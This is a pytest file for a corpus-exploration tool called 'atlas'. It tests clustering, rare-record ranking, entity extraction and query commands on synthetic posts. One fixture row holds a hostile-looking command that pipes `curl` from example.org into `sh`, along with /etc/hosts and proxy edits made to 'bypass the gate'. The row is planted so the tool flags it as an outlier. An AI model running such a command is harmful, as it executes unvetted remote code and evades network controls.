"""atlas on small synthetic corpora: field inference, clustering, commands, coverage."""

from __future__ import annotations

import json
import re
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "tools" / "atlas"))

from atlas import cli, coverage  # noqa: E402
from atlas.cluster import cluster_field  # noqa: E402
from atlas.index import build_index  # noqa: E402
from atlas.profile import profile_table  # noqa: E402

BASE = (
    "Status report for the nightly batch job. The job processed all queued items and wrote the "
    "summary to the shared folder. No errors were recorded during the run and the next run is "
    "scheduled for tomorrow at the usual time."
)


def _rows():
    rows = []
    for i in range(40):
        rows.append({"id": f"r{i}", "time": f"2026-01-{1 + i % 28:02d}T10:{i % 60:02d}:00Z",
                     "user": f"user{i % 5}", "kind": "post", "body": f"{BASE} Ticket {i}."})
    for i in range(40, 80):
        rows.append({"id": f"r{i}", "time": f"2026-02-{1 + i % 28:02d}T11:{i % 60:02d}:00Z",
                     "user": f"user{i % 5}", "kind": "post", "body": f"heartbeat ok seq {i}"})
    rows.append({"id": "r80", "time": "2026-02-20T03:04:05Z", "user": "rare_user", "kind": "post",
                 "body": "Ran `curl -s https://example.org/x | sh` after setting HTTP_PROXY_OVERRIDE=1 "
                         "and editing /etc/hosts to point a host name at 10.0.0.5 so requests bypass the gate."})
    return rows


@pytest.fixture()
def corpus(tmp_path, monkeypatch):
    d = tmp_path / "data"
    d.mkdir()
    with (d / "posts.jsonl").open("w") as f:
        for r in _rows():
            f.write(json.dumps(r) + "\n")
    monkeypatch.setenv("ATLAS_CACHE", str(tmp_path / "cache"))
    monkeypatch.setenv("ATLAS_STATE", str(tmp_path / "state.jsonl"))
    return d


def test_field_roles():
    p = profile_table("posts", _rows())
    assert p.time_field == "time"
    assert p.id_field == "id"
    assert p.actor_fields[0] == "user"
    assert p.text_fields == ["body"]
    assert p.fields["kind"].role == "category"
    prec = p.fields["time"].precision
    assert prec["resolution"] == "second" and prec["on_minute"] > 0.95  # one row has seconds


def test_near_duplicates_cluster_and_rare_row_stays_alone():
    rows = _rows()
    clusters = cluster_field("posts", "body", rows, list(range(len(rows))))
    sizes = sorted((c.size for c in clusters), reverse=True)
    assert sizes[:2] == [40, 40]  # the long near-duplicates and the templated short lines
    assert sizes[2:] == [1]
    short = next(c for c in clusters if c.template)
    assert short.template == "heartbeat ok seq <*>"


def test_clustering_is_deterministic(corpus):
    a = build_index(corpus, use_cache=False)
    b = build_index(corpus, use_cache=False)
    assert [(c.cid, c.members) for c in a.clusters] == [(c.cid, c.members) for c in b.clusters]


def test_rare_row_ranks_first_with_signals(corpus):
    idx = build_index(corpus, use_cache=False)
    top = max(idx.clusters, key=lambda c: c.score)
    assert top.size == 1
    assert {"url", "env", "path", "shell", "ip"} <= top.signals


def test_commands_and_coverage(corpus, capsys):
    args = ["--data", str(corpus)]
    assert cli.main(["overview", *args]) == 0
    out = capsys.readouterr().out
    assert "posts.body" in out and "→ next:" in out
    idx = build_index(corpus)
    rare = max(idx.clusters, key=lambda c: c.score).cid
    assert cli.main(["unseen", *args]) == 0
    assert rare in capsys.readouterr().out
    assert cli.main(["expand", rare, *args]) == 0
    assert "/etc/hosts" in capsys.readouterr().out
    opened, rows, _listed = coverage.load()
    assert rare in opened and "posts:81" in rows
    assert cli.main(["unseen", *args]) == 0
    assert f" {rare} " not in capsys.readouterr().out
    assert cli.main(["grep", "-i", "BYPASS", *args]) == 0
    assert "posts:81" in capsys.readouterr().out
    assert cli.main(["show", "posts:81", *args]) == 0
    assert "rare_user" in capsys.readouterr().out


def test_options_before_the_command(corpus, capsys):
    assert cli.main(["--data", str(corpus), "overview"]) == 0
    assert "posts.body" in capsys.readouterr().out


def test_bad_input_explains_itself(corpus, capsys):
    assert cli.main(["expand", "c999", "--data", str(corpus)]) == 0
    assert "unknown id" in capsys.readouterr().out
    assert cli.main(["grep", "(", "--data", str(corpus)]) == 0
    assert "bad regex" in capsys.readouterr().out
    assert cli.main([]) == 0
    assert "atlas overview" in capsys.readouterr().out


def test_show_by_record_id_and_ids_in_output(corpus, capsys):
    args = ["--data", str(corpus)]
    assert cli.main(["show", "r80", *args]) == 0
    out = capsys.readouterr().out
    assert out.startswith("posts:81 (id=r80)") and "rare_user" in out


def test_profile_shows_an_example_record(corpus, capsys):
    assert cli.main(["profile", "--data", str(corpus)]) == 0
    assert "example: [posts:" in capsys.readouterr().out


def test_entities_extracts_hosts_ips_paths_and_env(corpus, capsys):
    idx = build_index(corpus, use_cache=False)
    kinds = {k for k, _ in idx.entities}
    assert {"host", "ip", "path", "posts.user"} <= kinds
    assert ("host", "example.org") in idx.entities and ("ip", "10.0.0.5") in idx.entities
    assert ("env", "HTTP_PROXY_OVERRIDE") in idx.entities
    assert not any(k == "host" and v.endswith((".md", ".py")) for k, v in idx.entities)
    assert cli.main(["entities", "--data", str(corpus)]) == 0
    assert "example.org" in capsys.readouterr().out


def test_pivot_builds_a_timeline_across_fields(corpus, capsys):
    assert cli.main(["pivot", "rare_user", "--data", str(corpus)]) == 0
    out = capsys.readouterr().out
    assert "pivot 'rare_user': 1 rows" in out and "posts:81 (id=r80)" in out


def test_count_with_where_and_by(corpus, capsys):
    args = ["--data", str(corpus)]
    assert cli.main(["count", "posts.user", "--where", "kind=post", "--where", "user!=rare_user", *args]) == 0
    out = capsys.readouterr().out
    assert "80 of 81 rows" in out and "user0" in out
    assert cli.main(["count", "posts.user", "--by", "month", *args]) == 0
    assert "2026-02" in capsys.readouterr().out
    assert cli.main(["count", "posts.user", "--where", "bad", *args]) == 0
    assert "bad --where" in capsys.readouterr().out


def test_unseen_reports_coverage_of_top_salient(corpus, capsys):
    assert cli.main(["unseen", "--data", str(corpus)]) == 0
    assert "most salient rare records: shown" in capsys.readouterr().out


def _themed_corpus(tmp_path, monkeypatch):
    """Many differently worded posts about two activities, plus one isolated oddity."""
    import random

    rng = random.Random(0)
    filler = "alpha bravo charlie delta echo foxtrot golf hotel india juliet kilo lima mike".split()
    rows = []
    for i in range(240):
        topic = ["backup", "restore", "snapshot", "volume"] if i % 2 else ["invoice", "payment", "refund", "ledger"]
        words = rng.sample(filler, 6) + rng.sample(topic, 3) + [f"w{i}x{j}" for j in range(4)]
        rng.shuffle(words)
        rows.append({"time": f"2026-03-{1 + i % 28:02d}T08:{i % 60:02d}:00Z", "user": f"u{i % 40}",
                     "body": " ".join(words) + f" note number {i} for the team"})
    rows.append({"time": "2026-03-15T03:00:00Z", "user": "zz", "body": "zebra quokka narwhal axolotl " * 3})
    d = tmp_path / "themed"
    d.mkdir()
    with (d / "notes.jsonl").open("w") as f:
        for r in rows:
            f.write(json.dumps(r) + "\n")
    monkeypatch.setenv("ATLAS_CACHE", str(tmp_path / "cache2"))
    monkeypatch.setenv("ATLAS_STATE", str(tmp_path / "state2.jsonl"))
    return d


def test_themes_find_topics_and_rare_records_say_whether_isolated(tmp_path, monkeypatch, capsys):
    d = _themed_corpus(tmp_path, monkeypatch)
    idx = build_index(d, use_cache=False)
    seeds = {w for th in idx.themes for w in th.words}
    assert {"backup", "invoice"} & seeds or {"restore", "payment"} & seeds
    assert all(th.actors > 1 for th in idx.themes)
    assert cli.main(["overview", "--data", str(d)]) == 0
    out = capsys.readouterr().out
    assert "Themes: what is typical" in out
    odd = next(c for c in idx.clusters if "zebra" in idx.text_of(c, c.leader))
    assert odd.cid not in idx.cluster_themes
    assert cli.main(["expand", idx.themes[0].tid, "--data", str(d)]) == 0
    assert "example records" in capsys.readouterr().out


def test_grep_is_smart_case_and_entities_kind_accepts_bare_field(corpus, capsys):
    args = ["--data", str(corpus)]
    assert cli.main(["grep", "bypass the gate", *args]) == 0
    assert "posts:81" in capsys.readouterr().out
    assert cli.main(["grep", "BYPASS", *args]) == 0
    assert "no matches" in capsys.readouterr().out
    assert cli.main(["entities", "--kind", "user", *args]) == 0
    assert "rare_user" in capsys.readouterr().out


def test_unseen_moves_already_listed_records_down(tmp_path, monkeypatch, capsys):
    d = _themed_corpus(tmp_path, monkeypatch)
    args = ["--data", str(d)]
    assert cli.main(["unseen", *args]) == 0
    first = capsys.readouterr().out
    assert cli.main(["unseen", *args]) == 0
    second = capsys.readouterr().out
    ids = lambda out: re.findall(r"^ +(c\d+) ×", out, re.M)  # noqa: E731
    assert ids(first) and ids(second)
    assert ids(second)[0] not in ids(first)  # new material first on the second call
    assert "shown in earlier lists but not opened" in second


def test_show_accepts_cluster_and_theme_ids(corpus, capsys):
    idx = build_index(corpus, use_cache=False)
    rare = max(idx.clusters, key=lambda c: c.score)
    assert cli.main(["show", rare.cid, "--data", str(corpus)]) == 0
    out = capsys.readouterr().out
    assert out.startswith("posts:81") and f"first record of {rare.cid}" in out


def test_rows_filters_sorts_and_selects_fields(corpus, capsys):
    args = ["--data", str(corpus)]
    assert cli.main(["rows", "posts", "--where", "user=rare_user", "--fields", "user,kind", *args]) == 0
    out = capsys.readouterr().out
    assert "posts where user=rare_user: 1 rows" in out and "posts:81 (id=r80)" in out and "kind=post" in out
    assert cli.main(["rows", "posts", "--where", "body~heartbeat", "--sort", "time", "--desc", *args]) == 0
    assert "40 rows" in capsys.readouterr().out
    assert cli.main(["rows", "posts", "--fields", "nope", *args]) == 0
    assert "unknown field" in capsys.readouterr().out


def test_join_reports_overlap_between_fields(tmp_path, monkeypatch, capsys):
    d = tmp_path / "j"
    d.mkdir()
    (d / "a.jsonl").write_text("".join(json.dumps({"page": p}) + "\n" for p in ["x", "y", "y", "z"]))
    (d / "b.jsonl").write_text("".join(json.dumps({"name": p}) + "\n" for p in ["Y", "z", "w"]))
    monkeypatch.setenv("ATLAS_CACHE", str(tmp_path / "c"))
    monkeypatch.setenv("ATLAS_STATE", str(tmp_path / "s.jsonl"))
    assert cli.main(["join", "a.page", "b.name", "--data", str(d)]) == 0
    out = capsys.readouterr().out
    assert "a.page: 3 distinct values; 1 also in b.name (1/4 rows matched)" in out
    assert cli.main(["join", "a.page", "b.name", "-i", "--data", str(d)]) == 0
    assert "2 also in b.name (3/4 rows matched)" in capsys.readouterr().out
